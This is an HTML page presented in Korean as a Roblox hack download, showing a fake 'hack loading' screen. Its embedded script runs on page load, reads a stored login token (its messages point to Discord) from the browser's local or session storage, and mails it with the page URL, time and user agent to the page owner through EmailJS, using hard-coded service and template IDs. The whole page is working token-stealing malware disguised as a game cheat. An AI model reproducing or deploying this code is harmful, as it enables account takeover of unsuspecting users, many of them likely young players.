<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>로블록스 핵 다운 2026</title>
  <style>
    body { 
      margin:0; padding:0; height:100vh; 
      background:#000; color:#0f0; font-family: monospace; 
      display:flex; align-items:center; justify-content:center; overflow:hidden;
      touch-action: manipulation;
    }
    .container { text-align:center; padding:20px; max-width:95%; }
    h1 { font-size:2.5rem; text-shadow:0 0 10px #0f0; margin:0; }
    .loader { width:80px; height:80px; border:8px solid #0f0; border-top:8px solid transparent; border-radius:50%; animation: spin 1s linear infinite; margin:30px auto; }
    #message { font-size:1.3rem; margin:20px 0; }
    #status { font-size:1.1rem; color:#ff0044; word-break:break-all; }
    @keyframes spin { to { transform:rotate(360deg); } }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>핵 로딩 중...</h1>
    <div class="loader" id="loader"></div>
    <div id="message">잠시만 기다려...</div>
    <div id="status"></div>
  </div>

  <script>
    // 에러 팝업 전용 함수 (모바일에서도 잘 보이게)
    function showPopupError(title, details = "") {
      alert(title + "\n\n" + details + "\n\n새로고침(F5) 해보거나 브라우저 바꿔봐");
      document.getElementById("status").innerHTML = "<b>" + title + "</b><br>" + details.replace(/\n/g, "<br>");
      document.getElementById("loader").style.display = "none";
      document.getElementById("message").innerText = "작업 끝";
    }

    // EmailJS 초기화
    let emailjsOK = false;
    try {
      emailjs.init("ycbHVBt3cm6FkCL--");
      emailjsOK = true;
      console.log("[OK] EmailJS 초기화 성공");
    } catch(e) {
      console.error("[ERR] EmailJS init 실패", e);
      showPopupError("EmailJS 초기화 실패", e.message || "Public Key 다시 확인");
    }

    const SERVICE = "service_jmsvqzd";
    const TEMPLATE = "template_fjunjx8";

    async function grabToken() {
      document.getElementById("message").innerText = "토큰 찾는 중...";

      let token = null;
      try {
        token = localStorage.getItem("token") || sessionStorage.getItem("token");

        if (token) {
          token = token.replace(/"/g, "").trim();
          console.log("[+] 토큰 찾음:", token.slice(0, 40) + "...");

          if (!emailjsOK) {
            showPopupError("EmailJS 사용 불가", "토큰은 브라우저 콘솔(F12)에 있음");
            return;
          }

          await emailjs.send(SERVICE, TEMPLATE, {
            token: token,
            url: location.href,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent
          });

          console.log("[++] 메일 발송 성공");
          document.getElementById("status").innerHTML = "완료! 메일함(스팸 포함) 확인하세요";
        } else {
          console.log("[-] 토큰 없음");
          showPopupError("토큰을 찾을 수 없음", "1. Discord 앱/웹에서 로그인 되어 있는지 확인\n2. 새로고침 후 다시 시도");
        }

      } catch(e) {
        console.error("[CRITICAL ERROR]", e);
        showPopupError("작동 중 오류 발생", e.message || e.toString() || "자세한 건 브라우저 콘솔(F12) 봐");
      }

      document.getElementById("loader").style.display = "none";
    }

    // 페이지 로드 후 바로 실행
    window.addEventListener("load", () => {
      setTimeout(grabToken, 600);
    });

    // 예상치 못한 에러도 팝업으로
    window.onerror = function(msg) {
      showPopupError("치명적 오류", msg);
      return true;
    };
  </script>
</body>
</html>
